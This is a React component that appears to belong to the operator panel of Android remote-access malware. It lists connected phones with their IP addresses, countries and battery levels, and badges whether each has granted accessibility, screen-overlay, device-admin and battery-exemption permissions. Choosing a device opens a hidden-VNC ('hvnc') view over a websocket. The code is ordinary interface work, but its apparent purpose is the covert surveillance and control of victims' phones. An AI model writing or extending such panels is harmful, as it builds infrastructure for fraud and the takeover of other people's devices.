import React, { useState } from 'react';
import { useStore } from '../store/useStore';
import { subscribeDevice } from '../services/wsService';
import type { Device } from '../types';

export const DeviceList: React.FC = () => {
  const devices = useStore((s) => s.devices);
  const selectedDeviceId = useStore((s) => s.selectedDeviceId);
  const selectDevice = useStore((s) => s.selectDevice);
  const setSection = useStore((s) => s.setSection);
  const [filter, setFilter] = useState('');

  const filtered = devices.filter(
    (d) =>
      filter === '' ||
      d.model.toLowerCase().includes(filter.toLowerCase()) ||
      d.deviceId.includes(filter) ||
      d.country?.toLowerCase().includes(filter.toLowerCase())
  );

  const select = (d: Device) => {
    selectDevice(d.id);
    subscribeDevice(d.id);
    setSection('hvnc');
  };

  const batteryColor = (level: number) => {
    if (level > 50) return 'text-green-400';
    if (level > 20) return 'text-amber-400';
    return 'text-red-400';
  };

  const permBadge = (ok: boolean, label: string) => (
    <span
      key={label}
      className={`text-[9px] font-mono px-1 py-0.5 rounded ${ok ? 'bg-green-900/40 text-green-400' : 'bg-red-900/40 text-red-400'}`}
    >
      {label}
    </span>
  );

  return (
    <div className="h-full flex flex-col" style={{ fontFamily: 'var(--font-mono)' }}>
      {/* Header */}
      <div className="px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-3 shrink-0">
        <div className="flex items-center gap-2">
          <span className="text-xs font-semibold text-white/70 tracking-widest uppercase">Devices</span>
          <span className="text-xs px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">
            {devices.filter((d) => d.status === 'online').length}/{devices.length}
          </span>
        </div>
        <input
          type="text"
          placeholder="filter..."
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          className="w-40 bg-slate-900 border border-slate-700 rounded px-2.5 py-1 text-xs text-white/70 outline-none focus:border-cyan-600 placeholder-slate-600 font-mono"
        />
      </div>

      {/* List */}
      <div className="flex-1 overflow-y-auto px-3 py-2 space-y-1.5">
        {filtered.length === 0 && (
          <div className="flex flex-col items-center justify-center h-full gap-3 py-12">
            <div className="w-12 h-12 rounded-full border border-slate-700 flex items-center justify-center">
              <svg className="w-6 h-6 text-slate-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18h3" />
              </svg>
            </div>
            <p className="text-xs text-slate-600">No devices connected</p>
          </div>
        )}

        {filtered.map((d) => {
          const selected = d.id === selectedDeviceId;
          return (
            <button
              key={d.id}
              onClick={() => select(d)}
              className={`w-full text-left rounded-lg border px-3 py-2.5 transition-all ${
                d.status === 'offline'
                  ? 'border-slate-800/50 bg-slate-900/20 opacity-50'
                  : selected
                    ? 'border-cyan-600/50 bg-cyan-950/20'
                    : 'border-slate-800 bg-slate-900/40 hover:border-slate-700 hover:bg-slate-800/50'
              }`}
            >
              {/* Row 1 */}
              <div className="flex items-center justify-between mb-1.5">
                <div className="flex items-center gap-2">
                  <span
                    className={`w-2 h-2 rounded-full shrink-0 ${
                      d.status === 'online' ? 'bg-green-400' : 'bg-slate-600'
                    }`}
                  />
                  <span className="text-xs font-semibold text-white/80 truncate max-w-[140px]">
                    {d.brand} {d.model}
                  </span>
                </div>
                <div className="flex items-center gap-1.5 shrink-0">
                  <span className={`text-xs font-mono ${batteryColor(d.batteryLevel)}`}>
                    {d.batteryLevel}%{d.isCharging ? '⚡' : ''}
                  </span>
                </div>
              </div>

              {/* Row 2 */}
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[10px] text-slate-500 font-mono">{d.deviceId.slice(-12)}</span>
                <span className="text-[10px] text-slate-400 font-mono">
                  Android {d.androidVersion}
                </span>
              </div>

              {/* Row 3 — perms */}
              <div className="flex items-center gap-1 flex-wrap">
                {permBadge(d.hasAccessibility, 'A11Y')}
                {permBadge(d.hasOverlay, 'OVL')}
                {permBadge(d.hasAdmin, 'ADM')}
                {permBadge(d.hasBatteryExemption, 'BAT')}
                {d.vncActive && (
                  <span className="text-[9px] font-mono px-1 py-0.5 rounded bg-cyan-900/40 text-cyan-400">VNC</span>
                )}
              </div>

              {/* Row 4 — network */}
              <div className="flex items-center justify-between mt-1.5">
                <span className="text-[10px] text-slate-600 font-mono">{d.ipAddress}</span>
                <span className="text-[10px] text-slate-500 font-mono">{d.country} · {d.networkType}</span>
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
};
